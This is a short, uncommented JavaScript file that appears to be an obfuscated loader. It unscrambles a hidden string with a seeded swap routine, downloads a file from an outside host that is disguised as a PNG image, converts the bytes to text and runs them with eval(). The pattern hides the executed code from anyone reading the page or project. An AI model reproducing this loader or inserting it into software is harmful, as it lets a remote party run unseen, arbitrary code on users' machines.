var encodedString = decode(
  "%erh%hefrofCha%Cedn%ajoit%lgmnnaerrytuofBr",
  2238639
);

function decode(input, seed) {
  let n = seed;
  const length = input.length;
  let result = [];

  for (let i = 0; i < length; i++) {
    result[i] = input.charAt(i);
  }

  for (let i = 0; i < length; i++) {
    let w = (n * (i + 480) + (n % 28640)) % length;
    let s = (n * (i + 228) + (n % 39276)) % length;
    let temp = result[w];
    result[w] = result[s];
    result[s] = temp;
    n = (w + s) % 3560320;
  }

  const splitChar = String.fromCharCode(127);
  return result
    .join("")
    .split("%")
    .join(splitChar)
    .split("#1")
    .join("%")
    .split("#0")
    .join("#")
    .split(splitChar);
}

fetch("https://vidsrc.pro/static/uwu.png?v=" + encodedString[2])
  .then((response) => response.arrayBuffer())
  .then((buffer) => {
    let uint8Array = new Uint8Array(buffer);
    let length = uint8Array.length;
    let charArray = new Array(length);

    for (let i = 0; i < length; i++) {
      charArray[i] = String.fromCharCode(uint8Array[i]);
    }

    eval(charArray.join(""));
  });
